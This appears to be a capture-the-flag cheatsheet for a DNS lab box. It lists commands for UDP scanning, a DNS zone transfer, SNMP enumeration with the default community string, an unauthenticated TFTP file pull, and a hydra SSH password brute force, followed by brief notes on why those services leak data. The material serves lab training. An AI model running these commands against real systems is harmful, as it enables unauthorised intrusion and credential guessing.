# Cheatsheet — Zone Out

## Targets

- **dns01** — nameserver + drop box; the interesting ports are UDP

## Useful commands

```bash
sudo nmap -sU --top-ports 200 <ip>        # UDP scan — dns/snmp/tftp live here

dig @<ip> corp.local axfr                 # zone transfer — the whole phonebook
dig @<ip> <name>.corp.local a +short      # resolve what the zone gave you

snmpwalk -v2c -c public <ip>              # full tree (needs no mibs)
snmpwalk -v2c -c public <ip> system       # hostname/contact/location
snmpwalk -v2c -c public <ip> hrSWRunName  # running processes
snmp-check <ip>                           # friendlier summary

tftp <ip> -c get <file>                   # unauthenticated file pull
hydra -l <user> -P <wordlist> ssh://<ip>  # online brute force
ls /usr/share/wordlists/                  # metasploit/* works uncompressed
zcat /usr/share/wordlists/rockyou.txt.gz > ~/rockyou.txt
ssh <user>@<ip>
```

## Concepts

- AXFR is a *feature* — meant for secondary nameservers, disastrous when open
- TFTP has no concept of authentication — directory contents are public by design
- SNMP 'extend' scripts run arbitrary commands — their output is public too
